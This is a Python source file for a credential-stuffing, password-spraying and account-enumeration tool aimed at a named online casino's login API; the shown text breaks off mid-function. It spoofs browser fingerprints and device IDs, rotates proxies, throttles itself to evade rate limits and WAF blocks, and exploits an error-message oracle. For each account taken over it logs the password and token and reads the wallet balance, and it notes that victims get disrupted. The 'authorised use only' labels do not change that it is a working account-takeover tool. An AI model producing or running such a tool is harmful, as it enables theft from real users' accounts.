#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
a51_stuffer.py - Area51.casino authentication testing harness
================================================================

Target-specific request contract, derived from the site's own client bundle
(https://www.area51.casino/assets/app-network-c809291f.js) and confirmed live:

    POST https://api.area51.casino/api/v1/auth/player/login
    Content-Type: application/json

    {
      "username":  "<user>",
      "password":  "<pass>",
      "language":  "en",
      "device_id": "<32 lowercase hex>",          # X-Device-Id header mirrors this
      "client": {
          "tz": "America/New_York",
          "languages": ["en-US", "en"],
          "screen": "1920x1080@1",
          "platform": "Win32",
          "hardware_concurrency": 8,
          "touch": false
      }
    }

Observed response semantics (2026-11-10):

    200 + {"auth_token": "..."}                        -> valid credentials
    401 + {"non_field_errors":["Invalid username"]}    -> account does not exist
    401 + {"non_field_errors":["Incorrect password. Please try again."]}
                                                       -> account exists, wrong password
    401 + {"non_field_errors":[" You are already logged in on another device"]}
                                                       -> password correct, but an active
                                                          session blocks token issuance
    429                                                -> throttled (honour Retry-After)
    403                                                -> WAF/geo block
    auth scheme for authenticated calls: "Authorization: JWT <auth_token>"

The 401 split is an account-enumeration oracle on this target: identical
requests differing only in username produce distinguishable messages.

Modes
-----
  stuff      combos (user:pass) -> login attempts
  spray      user list + one password (1 attempt per user)
  enumerate  user list + throwaway password -> classify account existence

Examples
--------
  # connectivity + contract check, no credential tested
  ./a51_stuffer.py --check

  # small stuffing run, 4 workers, 2 req/s global, rotating proxies
  ./a51_stuffer.py combos.txt -t 4 --rps 2 --proxy-file proxies.txt -o run1

  # password spray of one password across a user list
  ./a51_stuffer.py -m spray -U users.txt -p 'Summer2026!' --rps 1

  # account enumeration against the 401 message oracle
  ./a51_stuffer.py -m enumerate -U users.txt -o enum1

  # single credential check that also records the SC/GC wallet balance
  ./a51_stuffer.py -u alice -p 'secret' --validate -o one

On a successful login the harness reads GET /api/v0/users/wallet/ and records the
Sweeps Coins balance exactly as the dashboard header renders it
(sc_playable + sc_bonus + sc_redeamable) plus Gold Coins (gc). Disable with
--no-balance.

Operational warnings
--------------------
  * The account allows one active session. A second login while the account is
    in use returns "You are already logged in on another device" and no token;
    the operator must log the other device out (or wait for expiry) before a
    successful login is possible. Confirmed against a live account.
  * A successful login can invalidate the victim's existing session
    ("repeated_login" path in the site's interceptor). Expect user disruption
    and fraud-team alerts; keep volume low and stop on first confirmed hit.
  * Repeated failures may lock accounts. Lockout threshold was not tested.
  * Only run against accounts you are authorised to test.

Authorised engagement use only.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import hmac
import json
import logging
import os
import random
import signal
import string
import sys
import threading
import time
from collections import Counter
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterator, Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:  # pragma: no cover
    sys.exit("missing dependency: pip install requests")


# --------------------------------------------------------------------------
# Verdict vocabulary
# --------------------------------------------------------------------------
HIT = "HIT"
SESSION_CONFLICT = "HIT_SESSION_CONFLICT"
SESSION_HELD = "VALID_CRED_SESSION_HELD"
VALID_USER = "VALID_USER_BAD_PASSWORD"
NO_USER = "UNKNOWN_USER"
DENIED = "DENIED"
THROTTLED = "THROTTLED"
BLOCKED = "BLOCKED"
SERVER_ERROR = "SERVER_ERROR"
NETWORK_ERROR = "NETWORK_ERROR"
UNKNOWN = "UNKNOWN"

HIT_VERDICTS = {HIT, SESSION_CONFLICT}
# Credentials proven correct but not necessarily exchanged for a token:
# SESSION_HELD means the password verified but an active session elsewhere
# blocked token issuance (observed: 401 "You are already logged in on another device").
CRED_VERDICTS = HIT_VERDICTS | {SESSION_HELD}


# --------------------------------------------------------------------------
# Browser profiles (kept internally consistent: UA <-> platform <-> screen)
# --------------------------------------------------------------------------
PROFILES = [
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "platform": "Win32",
        "ch_platform": '"Windows"',
        "ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "screen": "1920x1080@1",
        "hw": 8,
        "tz": "America/New_York",
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "platform": "Win32",
        "ch_platform": '"Windows"',
        "ch_ua": '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
        "screen": "1536x864@1.25",
        "hw": 12,
        "tz": "America/Chicago",
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "platform": "MacIntel",
        "ch_platform": '"macOS"',
        "ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "screen": "1512x982@2",
        "hw": 8,
        "tz": "America/Los_Angeles",
    },
    {
        "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "platform": "Linux x86_64",
        "ch_platform": '"Linux"',
        "ch_ua": '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="99"',
        "screen": "1920x1080@1",
        "hw": 4,
        "tz": "Europe/London",
    },
]


@dataclass(frozen=True)
class Combo:
    username: str
    password: str

    @property
    def key(self) -> str:
        return hashlib.sha256(
            f"{self.username.lower()}\x00{self.password}".encode("utf-8", "replace")
        ).hexdigest()[:16]


@dataclass
class Outcome:
    verdict: str
    status: Optional[int]
    message: str
    token: Optional[str] = None
    validated: Optional[bool] = None
    sc_balance: Optional[str] = None
    gc_balance: Optional[str] = None
    sc_breakdown: Optional[dict] = None


@dataclass
class Result:
    combo: Combo
    outcome: Outcome
    device_id: str
    proxy: Optional[str]
    elapsed_ms: int
    ts: str


def as_float(value) -> float:
    try:
        return float(value or 0)
    except (TypeError, ValueError):
        return 0.0


def wallet_summary(body) -> tuple[Optional[str], Optional[str], Optional[dict]]:
    """Reproduce the header widget's math from the wallet payload.

    The site's UserDropDown component renders Sweeps Coins as
    (sc_playable + sc_bonus + sc_redeamable).toFixed(2) and Gold Coins as
    Number(gc||0).toFixed(2).
    """
    if not isinstance(body, dict):
        return None, None, None
    container = body
    for key in ("data", "wallet", "result"):
        nested = body.get(key)
        if isinstance(nested, dict) and ("sc_playable" in nested or "gc" in nested):
            container = nested
            break
    if not ({"sc_playable", "sc_bonus", "sc_redeamable", "gc"} & set(container)):
        return None, None, None
    playable = as_float(container.get("sc_playable"))
    bonus = as_float(container.get("sc_bonus"))
    redeemable = as_float(container.get("sc_redeamable"))
    total = playable + bonus + redeemable
    breakdown = {
        "sc_playable": f"{playable:.2f}",
        "sc_bonus": f"{bonus:.2f}",
        "sc_redeamable": f"{redeemable:.2f}",
        "gc": f"{as_float(container.get('gc')):.2f}",
    }
    return f"{total:.2f}", breakdown["gc"], breakdown


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def parse_proxy(value: str) -> str:
    value = value.strip()
    if not value:
        raise ValueError("empty proxy")
    if "://" not in value:
        value = "http://" + value
    return value


def load_proxies(args) -> list[str]:
    out: list[str] = []
    if args.proxy:
        out.extend(parse_proxy(p) for p in args.proxy.split(",") if p.strip())
    if args.proxy_file:
        for line in Path(args.proxy_file).read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(parse_proxy(line))
    return out


def read_lines(path: str) -> list[str]:
    try:
        data = Path(path).read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        sys.exit(f"cannot read {path}: {exc}")
    return [ln.strip() for ln in data.splitlines() if ln.strip() and not ln.lstrip().startswith("#")]


def parse_combo_line(line: str) -> Optional[Combo]:
    """Accept user:pass, user|pass, user<TAB>pass, user;pass (first separator wins)."""
    for sep in ("\t", "|", ":", ";"):
        if sep in line:
            user, _, pwd = line.partition(sep)
            user, pwd = user.strip(), pwd.strip()
            if user and pwd:
                return Combo(user, pwd)
    return None


class RateLimiter:
    """Global pacing with adaptive slowdown on throttling / WAF pushback."""

    def __init__(self, rps: float, min_rps: float = 0.2) -> None:
        self.base_rps = max(rps, 0.05)
        self.rps = self.base_rps
        self.min_rps = min(min_rps, self.base_rps)
        self._lock = threading.Lock()
        self._next_at = 0.0
        self._pause_until = 0.0

    def acquire(self) -> None:
        while True:
            with self._lock:
                now = time.monotonic()
                target = max(self._next_at, self._pause_until)
                if now >= target:
                    self._next_at = now + (1.0 / self.rps)
                    return
                delay = target - now
            time.sleep(min(delay, 1.0))

    def penalise(self, retry_after: Optional[float] = None) -> None:
        with self._lock:
            now = time.monotonic()
            pause = retry_after if retry_after and retry_after > 0 else max(3.0, 4.0 / self.rps)
            self._pause_until = max(self._pause_until, now + pause)
            self.rps = max(self.min_rps, self.rps / 2.0)

    def reward(self) -> None:
        with self._lock:
            if self.rps < self.base_rps:
                self.rps = min(self.base_rps, self.rps * 1.05 + 0.01)

    @property
    def current_rps(self) -> float:
        with self._lock:
            return self.rps


class DeviceIdFactory:
    """Stable synthetic device identifiers, mirroring the site's 32-hex format."""

    def __init__(self, mode: str, fixed: Optional[str]) -> None:
        self.mode = mode
        self.fixed = fixed
        self._secret = os.urandom(32)
        self._lock = threading.Lock()
        self._worker_ids: dict[int, str] = {}

    @staticmethod
    def _random_hex() -> str:
        return os.urandom(16).hex()

    def for_attempt(self, username: str, worker_id: int) -> str:
        if self.mode == "fixed":
            return self.fixed or self._random_hex()
        if self.mode == "per-account":
            digest = hmac.new(self._secret, username.strip().lower().encode(), hashlib.sha256)
            return digest.hexdigest()[:32]
        with self._lock:
            if worker_id not in self._worker_ids:
                self._worker_ids[worker_id] = self._random_hex()
            return self._worker_ids[worker_id]


def message_from_body(body, text: str) -> str:
    if isinstance(body, dict):
        for key in ("non_field_errors", "errors", "detail", "message", "error"):
            value = body.get(key)
            if isinstance(value, list) and value:
                return " ".join(str(v) for v in value).strip()
            if isinstance(value, str) and value.strip():
                return value.strip()
        return ""
    return (text or "").strip()[:300]


def token_from_body(body) -> Optional[str]:
    if not isinstance(body, dict):
        return None
    for key in ("auth_token", "access_token", "token", "access"):
        value = body.get(key)
        if isinstance(value, str) and value:
            return value
    for container in ("data", "result", "user"):
        nested = body.get(container)
        if isinstance(nested, dict):
            found = token_from_body(nested)
            if found:
                return found
    return None


def classify(status: int, body, text: str) -> Outcome:
    msg = message_from_body(body, text)
    low = msg.lower()
    token = token_from_body(body)

    if "already logged in" in low or "another device" in low:
        return Outcome(SESSION_HELD, status, msg or "active session elsewhere", token)

    if "repeated_login" in low or "repeated login" in low:
        return Outcome(SESSION_CONFLICT, status, msg or "repeated_login", token)

    if status in (200, 201, 202) and token:
        return Outcome(HIT, status, msg or "auth_token issued", token)

    if status == 401:
        if "invalid username" in low:
            return Outcome(NO_USER, status, msg)
        if "incorrect password" in low or ("password" in low and "incorrect" in low):
            return Outcome(VALID_USER, status, msg)
        return Outcome(DENIED, status, msg or "unauthorized")

    if status == 429:
        return Outcome(THROTTLED, status, msg or "rate limited")

    if status == 403:
        blob = (text or "").lower()
        if "cloudflare" in blob or "attention required" in blob or "cf-error" in blob or "blocked" in blob:
            return Outcome(BLOCKED, status, msg or "WAF block")
        return Outcome(DENIED, status, msg or "forbidden")

    if status >= 500:
        return Outcome(SERVER_ERROR, status, msg or "server error")

    if status in (200, 201, 202):
        return Outcome(UNKNOWN, status, msg or "2xx without auth_token")

    return Outcome(UNKNOWN, status, msg or f"http {status}")


def retry_after_seconds(headers) -> Optional[float]:
    raw = headers.get("Retry-After") if headers else None
    if not raw:
        return None
    try:
        return max(0.0, float(raw))
    except (TypeError, ValueError):
        return None


# --------------------------------------------------------------------------
# Harness
# --------------------------------------------------------------------------
class Stuffer:
    def __init__(self, args) -> None:
        self.args = args
        self.api = args.api_url.rstrip("/")
        self.login_url = self.api + args.login_path
        self.validate_url = self.api + args.validate_path
        # Keep the trailing slash: the endpoint 301-redirects without it.
        self.wallet_url = args.wallet_url
        self.limiter = RateLimiter(args.rps)
        self.devices = DeviceIdFactory(args.device_id_mode, args.device_id)
        self.proxies = load_proxies(args)
        self.stop = threading.Event()
        self.lock = threading.Lock()
        self.counts: Counter[str] = Counter()
        self.hits: list[Result] = []
        self.done = 0
        self.total = 0
        self.skipped = 0
        self.started_at = time.monotonic()
        self._sessions: dict[int, requests.Session] = {}
        self._session_lock = threading.Lock()
        self._journal_fh = None
        self._hits_fh = None
        self._valid_fh = None
        self._csv_fh = None
        self._csv_writer = None
        self._seen: set[str] = set()

    # -- output plumbing ---------------------------------------------------
    def _open_outputs(self) -> None:
        args = self.args
        self.results_path = Path(f"{args.output}_results.csv")
        self.journal_path = Path(f"{args.output}_journal.jsonl")
        self.hits_path = Path(f"{args.output}_hits.tsv")

        if args.resume and self.journal_path.exists():
            for line in self.journal_path.read_text(encoding="utf-8", errors="replace").splitlines():
                try:
                    self._seen.add(json.loads(line)["key"])
                except (ValueError, KeyError, TypeError):
                    continue
            if self._seen:
                logging.info("resume: %d previously completed attempts skipped", len(self._seen))

        new_csv = not self.results_path.exists() or self.results_path.stat().st_size == 0
        self._csv_fh = self.results_path.open("a", newline="", encoding="utf-8")
        self._csv_writer = csv.writer(self._csv_fh)
        if new_csv:
            self._csv_writer.writerow(
                ["timestamp", "username", "verdict", "http_status", "message",
                 "elapsed_ms", "proxy", "device_id", "validated",
                 "sc_balance", "gc_balance", "sc_playable", "sc_bonus", "sc_redeamable"]
            )
            self._csv_fh.flush()

        self._journal_fh = self.journal_path.open("a", encoding="utf-8")
        self._hits_fh = self.hits_path.open("a", encoding="utf-8")
        self.valid_path = Path(f"{args.output}_valid_users.txt")
        if args.mode in ("enumerate", "spray"):
            self._valid_fh = self.valid_path.open("a", encoding="utf-8")
        try:
            os.chmod(self.hits_path, 0o600)
        except OSError:
            pass

    def _close_outputs(self) -> None:
        for fh in (self._csv_fh, self._journal_fh, self._hits_fh, self._valid_fh):
            try:
                if fh:
                    fh.flush()
                    fh.close()
            except OSError:
                pass

    # -- http --------------------------------------------------------------
    def _session(self, worker_id: int) -> requests.Session:
        with self._session_lock:
            if worker_id not in self._sessions:
                s = requests.Session()
                s.trust_env = False
                adapter = HTTPAdapter(pool_connections=4, pool_maxsize=8, max_retries=0)
                s.mount("https://", adapter)
                s.mount("http://", adapter)
                s.verify = not self.args.insecure
                if self.proxies:
                    proxy = self.proxies[worker_id % len(self.proxies)]
                    s.proxies.update({"http": proxy, "https": proxy})
                    s._a51_proxy = proxy  # type: ignore[attr-defined]
                else:
                    s._a51_proxy = None  # type: ignore[attr-defined]
                self._sessions[worker_id] = s
            return self._sessions[worker_id]

    def _headers(self, profile: dict, device_id: str) -> dict[str, str]:
        return {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": self.args.origin,
            "Referer": self.args.origin + "/login",
            "X-Device-Id": device_id,
            "User-Agent": profile["ua"],
            "sec-ch-ua": profile["ch_ua"],
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": profile["ch_platform"],
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Priority": "u=1, i",
        }

    def _validate_token(self, token: str) -> Optional[bool]:
        try:
            s = self._session(0)
            r = s.get(
                self.validate_url,
                headers={"Accept": "application/json", "Authorization": f"JWT {token}",
                         "User-Agent": PROFILES[0]["ua"]},
                timeout=self.args.timeout,
                allow_redirects=False,
            )
            return r.status_code in (200, 201)
        except requests.RequestException:
            return None

    def _fetch_balance(self, token: str) -> tuple[Optional[str], Optional[str], Optional[dict]]:
        """Read the wallet behind the header balance widget.

        Sweeps Coins shown in the UI are sc_playable + sc_bonus + sc_redeamable;
        Gold Coins are gc. Source: UserDropDown-5d49cb1d.js.
        """
        if not self.args.capture_balance or not token:
            return None, None, None
        try:
            s = self._session(0)
            r = s.get(
                self.wallet_url,
                headers={
                    "Accept": "application/json",
                    "Authorization": f"JWT {token}",
                    "Origin": self.args.origin,
                    "Referer": self.args.origin + "/",
                    "User-Agent": PROFILES[0]["ua"],
                },
                timeout=self.args.timeout,
                allow_redirects=True,
            )
        except requests.RequestException as exc:
            logging.warning("balance fetch failed: %s", exc)
            return None, None, None
        if r.status_code != 200:
            logging.warning("balance fetch returned HTTP %s", r.status_code)
            return None, None, None
        try:
            body = r.json()
        except ValueError:
            logging.warning("balance fetch returned non-JSON: %r", (r.text or "")[:120])
            return None, None, None
        return wallet_summary(body)

    # -- one attempt -------------------------------------------------------
    def attempt(self, combo: Combo, worker_id: int) -> Result:
        args = self.args
        profile = PROFILES[worker_id % len(PROFILES)]
        device_id = self.devices.for_attempt(combo.username, worker_id)
        session = self._session(worker_id)
        proxy = getattr(session, "_a51_proxy", None)

        payload = {
            "username": combo.username,
            "password": combo.password,
            "language": args.language,
            "device_id": device_id,
            "client": {
                "tz": profile["tz"],
                "languages": ["en-US", "en"],
                "screen": profile["screen"],
                "platform": profile["platform"],
                "hardware_concurrency": profile["hw"],
                "touch": False,
            },
        }
        headers = self._headers(profile, device_id)

        last_exc: Optional[Exception] = None
        for attempt_no in range(args.retries + 1):
            if self.stop.is_set():
                break
            self.limiter.acquire()
            if args.jitter_max > 0:
                time.sleep(random.uniform(args.jitter_min, args.jitter_max))
            started = time.perf_counter()
            try:
                resp = session.post(
                    self.login_url,
                    json=payload,
                    headers=headers,
                    timeout=(args.connect_timeout, args.timeout),
                    allow_redirects=False,
                )
            except requests.RequestException as exc:
                last_exc = exc
                if attempt_no < args.retries:
                    time.sleep(min(30.0, 1.5 * (2 ** attempt_no)) + random.uniform(0, 0.5))
                    continue
                elapsed = int((time.perf_counter() - started) * 1000)
                return Result(combo, Outcome(NETWORK_ERROR, None, str(exc)[:300]),
                              device_id, proxy, elapsed, utc_now())

            elapsed = int((time.perf_counter() - started) * 1000)
            try:
                body = resp.json()
            except ValueError:
                body = None
            text = resp.text or ""

            if resp.status_code == 429:
                self.limiter.penalise(retry_after_seconds(resp.headers))
                if attempt_no < args.retries:
                    continue
            elif resp.status_code >= 500:
                self.limiter.penalise()
                if attempt_no < args.retries:
                    time.sleep(min(20.0, 1.0 * (2 ** attempt_no)))
                    continue
            elif resp.status_code == 403 and "cloudflare" in text.lower():
                self.limiter.penalise()
                if attempt_no < args.retries:
                    continue
            else:
                self.limiter.reward()

            outcome = classify(resp.status_code, body, text)
            if args.validate and outcome.verdict in HIT_VERDICTS and outcome.token:
                outcome.validated = self._validate_token(outcome.token)
            if outcome.verdict in HIT_VERDICTS and outcome.token:
                sc, gc, breakdown = self._fetch_balance(outcome.token)
                outcome.sc_balance, outcome.gc_balance, outcome.sc_breakdown = sc, gc, breakdown
            return Result(combo, outcome, device_id, proxy, elapsed, utc_now())

        return Result(combo, Outcome(NETWORK_ERROR, None, last_exc and str(last_exc)[:300] or "aborted"),
                      device_id, proxy, 0, utc_now())

    # -- result handling ---------------------------------------------------
    def record(self, result: Result) -> None:
        args = self.args
        outcome = result.outcome
        with self.lock:
            self.done += 1
            self.counts[outcome.verdict] += 1
            if outcome.verdict in CRED_VERDICTS:
                self.hits.append(result)
            hit_total = len(self.hits)
            done = self.done

        try:
            self._csv_writer.writerow([
                result.ts, result.combo.username, outcome.verdict, outcome.status,
                outcome.message, result.elapsed_ms, result.proxy or "",
                result.device_id, "" if outcome.validated is None else int(outcome.validated),
                outcome.sc_balance or "", outcome.gc_balance or "",
                (outcome.sc_breakdown or {}).get("sc_playable", ""),
                (outcome.sc_breakdown or {}).get("sc_bonus", ""),
                (outcome.sc_breakdown or {}).get("sc_redeamable", ""),
            ])
            self._csv_fh.flush()
            self._journal_fh.write(json.dumps({
                "key": result.combo.key, "username": result.combo.username,
                "verdict": outcome.verdict, "ts": result.ts,
            }) + "\n")
            self._journal_fh.flush()
        except (OSError, ValueError) as exc:
            logging.warning("write failure: %s", exc)

        if outcome.verdict == VALID_USER and self._valid_fh is not None:
            try:
                self._valid_fh.write(f"{result.combo.username}\t{result.ts}\n")
                self._valid_fh.flush()
            except OSError as exc:
                logging.warning("valid-user write failure: %s", exc)

        if outcome.verdict in CRED_VERDICTS:
            token = outcome.token or "-"
            try:
                self._hits_fh.write(
                    f"{result.combo.username}\t{result.combo.password}\t{token}\t"
                    f"{outcome.sc_balance or '-'}\t{outcome.gc_balance or '-'}\n"
                )
                self._hits_fh.flush()
            except OSError as exc:
                logging.warning("hit write failure: %s", exc)
            validated = {True: "validated", False: "token-rejected", None: "unvalidated"}[outcome.validated]
            tag = "HIT " if outcome.verdict in HIT_VERDICTS else "CRED"
            balance = f"SC={outcome.sc_balance}" if outcome.sc_balance is not None else "SC=?"
            logging.info("[%s] %s : %s | %s | %s | %s | %s", tag,
                         result.combo.username, self._mask(result.combo.password),
                         outcome.verdict, balance, validated,
                         (token[:24] + "...") if outcome.token else "no-token")

        if args.stop_after_hits and hit_total >= args.stop_after_hits:
            logging.warning("hit threshold reached (%d) - stopping", hit_total)
            self.stop.set()

        if args.max_attempts and done >= args.max_attempts:
            logging.warning("attempt limit reached (%d) - stopping", done)
            self.stop.set()

    def _mask(self, secret: str) -> str:
        if self.args.mask_passwords:
            return "*" * min(8, len(secret))
        return secret

    # -- input -------------------------------------------------------------
    def build_combos(self) -> list[Combo]:
        args = self.args
        combos: list[Combo] = []

        if args.mode == "stuff":
            if args.username and args.password:
                combos.append(Combo(args.username, args.password))
            if args.combolist:
                for line in read_lines(args.combolist):
                    combo = parse_combo_line(line)
                    if combo is None:
                        logging.debug("skipping malformed line")
                        continue
                    combos.append(combo)
        else:
            users: list[str] = []
            if args.users:
                users.extend(read_lines(args.users))
            if args.username:
                users.append(args.username)
            if args.mode == "spray":
                if not args.password:
                    sys.exit("spray mode requires -p/--password")
                combos = [Combo(u, args.password) for u in users]
            else:  # enumerate
                alphabet = string.ascii_letters + string.digits
                combos = [
                    Combo(u, "".join(random.choice(alphabet) for _ in range(20)))
                    for u in users
                ]

        seen: set[str] = set()
        unique: list[Combo] = []
        for c in combos:
            if c.key in seen:
                continue
            seen.add(c.key)
            unique.append(c)
        if args.limit:
            unique = unique[: args.limit]
        return unique

    # -- monitoring --------------------------------------------------------
    def _monitor(self) -> None:
        while not self.stop.wait(self.args.stats_interval):
            self._print_stats()
        self._print_stats()

    def _print_stats(self) -> None:
        elapsed = max(time.monotonic() - self.started_at, 0.001)
        with self.lock:
            done = self.done
            total = self.total
            counts = Counter(self.counts)
            hits = len(self.hits)
        rate = done / elapsed
        pct = (done / total * 100.0) if total else 0.0
        eta = ""
        if total and rate > 0 and done < total:
            remaining = (total - done) / rate
            eta = f" | ETA {int(remaining // 60)}m{int(remaining % 60):02d}s"
        logging.info(
            "progress %d/%d (%.1f%%) | %.2f req/s (limit %.2f) | hits=%d valid=%d "
            "no-user=%d throttled=%d blocked=%d err=%d%s",
            done, total, pct, rate, self.limiter.current_rps, hits,
            counts.get(VALID_USER, 0), counts.get(NO_USER, 0),
            counts.get(THROTTLED, 0), counts.get(BLOCKED, 0),
            counts.get(NETWORK_ERROR, 0) + counts.get(SERVER_ERROR, 0), eta,
        )

    # -- main loop ---------------------------------------------------------
    def run(self) -> int:
        args = self.args
        if args.check:
            return self.check()

        combos = self.build_combos()
        if not combos:
            logging.error("no credentials to test")
            return 2
        self.total = len(combos)
        self._open_outputs()

        logging.info("target : %s", self.login_url)
        logging.info("mode   : %s | attempts=%d | workers=%d | rps=%.2f | proxies=%d",
                     args.mode, self.total, args.threads, args.rps, len(self.proxies))
        logging.info("output : %s_{results.csv,journal.jsonl,hits.tsv}", args.output)

        monitor = threading.Thread(target=self._monitor, daemon=True)
        monitor.start()

        window = max(args.threads * 2, 4)
        pending: dict = {}
        iterator = iter(combos)
        exhausted = False
        worker_seq = 0
        interrupted = False

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            try:
                while True:
                    while (not exhausted and len(pending) < window
                           and not self.stop.is_set()):
                        try:
                            combo = next(iterator)
                        except StopIteration:
                            exhausted = True
                            break
                        if combo.key in self._seen:
                            self.skipped += 1
                            continue
                        self._seen.add(combo.key)
                        fut = pool.submit(self.attempt, combo, worker_seq % args.threads)
                        pending[fut] = combo
                        worker_seq += 1

                    if not pending:
                        break

                    done, _ = wait(list(pending), return_when=FIRST_COMPLETED, timeout=1.0)
                    for fut in done:
                        pending.pop(fut, None)
                        try:
                            self.record(fut.result())
                        except Exception as exc:  # defensive: never lose the loop
                            logging.error("worker error: %s", exc)

                    if self.stop.is_set() and not pending:
                        break
            except KeyboardInterrupt:
                interrupted = True
                logging.warning("interrupt received - draining workers")
                self.stop.set()
                for fut in pending:
                    fut.cancel()

        self.stop.set()
        self._close_outputs()
        self._summary(interrupted)
        return 0 if not interrupted else 130

    def _summary(self, interrupted: bool) -> None:
        elapsed = time.monotonic() - self.started_at
        with self.lock:
            counts = Counter(self.counts)
            hits = list(self.hits)
        logging.info("--- summary (%.1fs) ---", elapsed)
        for verdict, count in counts.most_common():
            logging.info("%-22s %d", verdict, count)
        if self.skipped:
            logging.info("%-22s %d", "skipped(resume)", self.skipped)
        logging.info("hits: %d -> %s", len(hits), self.hits_path)
        if self._valid_fh is not None:
            logging.info("valid accounts -> %s", self.valid_path)
        if hits:
            for r in hits[:20]:
                balance = (f"SC {r.outcome.sc_balance} / GC {r.outcome.gc_balance}"
                           if r.outcome.sc_balance is not None else "balance unavailable")
                logging.info("  %s : %s | %s %s", r.combo.username,
                             self._mask(r.combo.password), balance,
                             "(validated)" if r.outcome.validated else "")
        if interrupted:
            logging.warning("run interrupted; resume by re-running the same command")

    def check(self) -> int:
        """Send one probe with a guaranteed-nonexistent username."""
        probe = "zz_contract_probe_" + os.urandom(4).hex()
        combo = Combo(probe, "ContractProbe!" + os.urandom(4).hex())
        logging.info("probing %s with a throwaway username", self.login_url)
        result = self.attempt(combo, 0)
        outcome = result.outcome
        print(f"\nverdict : {outcome.verdict}")
        print(f"status  : {outcome.status}")
        print(f"message : {outcome.message}")
        print(f"latency : {result.elapsed_ms} ms")
        print(f"device  : {result.device_id}")
        if outcome.verdict == NO_USER:
            print("\ncontract OK: endpoint reachable, JSON accepted, error schema recognised.")
            print("note: this target distinguishes unknown users from wrong passwords.")
            return 0
        if outcome.verdict in (THROTTLED, BLOCKED):
            print("\nendpoint pushed back: lower --rps or rotate egress.")
            return 3
        print("\nunexpected response - inspect the capture manually.")
        return 1


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="a51_stuffer.py",
        description="Area51.casino credential testing harness (authorised use only)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("combolist", nargs="?", help="user:pass file for stuff mode")
    p.add_argument("-m", "--mode", choices=["stuff", "spray", "enumerate"], default="stuff")
    p.add_argument("-U", "--users", help="username list (spray/enumerate)")
    p.add_argument("-u", "--username", help="single username")
    p.add_argument("-p", "--password", help="single password (required for spray)")
    p.add_argument("-t", "--threads", type=int, default=4)
    p.add_argument("--rps", type=float, default=2.0, help="global requests per second")
    p.add_argument("--jitter-min", type=float, default=0.0)
    p.add_argument("--jitter-max", type=float, default=0.4)
    p.add_argument("--timeout", type=float, default=20.0, help="read timeout (s)")
    p.add_argument("--connect-timeout", type=float, default=10.0)
    p.add_argument("--retries", type=int, default=2)
    p.add_argument("--proxy", help="single proxy or comma list")
    p.add_argument("--proxy-file", help="one proxy per line, rotated per worker")
    p.add_argument("--device-id-mode", choices=["per-account", "per-worker", "fixed"],
                   default="per-account")
    p.add_argument("--device-id", help="32-hex device id for fixed mode")
    p.add_argument("--language", default="en")
    p.add_argument("--api-url", default="https://api.area51.casino")
    p.add_argument("--login-path", default="/api/v1/auth/player/login")
    p.add_argument("--validate-path", default="/api/v1/kyc/status")
    p.add_argument("--wallet-url", default="https://admin.area51.casino/api/v0/users/wallet/")
    p.add_argument("--capture-balance", dest="capture_balance", action="store_true", default=True,
                   help="fetch SC/GC balance for each successful login")
    p.add_argument("--no-balance", dest="capture_balance", action="store_false")
    p.add_argument("--origin", default="https://www.area51.casino")
    p.add_argument("-o", "--output", default="a51_run", help="output basename")
    p.add_argument("--resume", dest="resume", action="store_true", default=True)
    p.add_argument("--no-resume", dest="resume", action="store_false")
    p.add_argument("--limit", type=int, default=0)
    p.add_argument("--max-attempts", type=int, default=0)
    p.add_argument("--stop-after-hits", type=int, default=0)
    p.add_argument("--validate", action="store_true",
                   help="confirm issued tokens against /api/v1/kyc/status")
    p.add_argument("--mask-passwords", action="store_true")
    p.add_argument("--insecure", action="store_true", help="disable TLS verification")
    p.add_argument("--stats-interval", type=float, default=10.0)
    p.add_argument("--check", action="store_true", help="contract/reachability probe, then exit")
    p.add_argument("--dry-run", action="store_true", help="print one request and exit")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def dry_run(args) -> int:
    profile = PROFILES[0]
    combo = Combo(args.username or "example_user", args.password or "example_password")
    device_id = args.device_id or "0" * 32
    body = {
        "username": combo.username,
        "password": combo.password,
        "language": args.language,
        "device_id": device_id,
        "client": {
            "tz": profile["tz"], "languages": ["en-US", "en"],
            "screen": profile["screen"], "platform": profile["platform"],
            "hardware_concurrency": profile["hw"], "touch": False,
        },
    }
    print(f"POST {args.api_url.rstrip('/')}{args.login_path}")
    for k, v in {
        "Content-Type": "application/json", "Accept": "application/json",
        "Origin": args.origin, "Referer": args.origin + "/login",
